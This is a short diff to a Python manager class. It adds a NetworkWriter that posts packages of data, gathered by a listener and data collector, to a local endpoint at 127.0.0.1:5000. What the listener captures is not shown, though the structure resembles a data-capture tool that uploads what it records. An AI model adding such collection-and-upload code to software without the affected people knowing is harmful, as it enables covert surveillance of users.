@@ -4,6 +4,7 @@ from service.listener import Listener
 from service.data_collector import Package
 from time_stamp import time_stamp2
 from file_test import log
+from networkWriter import NetworkWriter
 
 class Manager:
     def __init__(self, hours = 5):
@@ -21,6 +22,8 @@ class Manager:
                 data = Package(temp_data)
                 pack_name = f'{time_stamp2()}.txt'
                 log(pack_name, str(data.encrypt()))
+                nw = NetworkWriter()
+                nw.send_data(data.export_package(),'http://127.0.0.1:5000/post')
     def stop(self):
         self.listener.stop()
         self.run = False
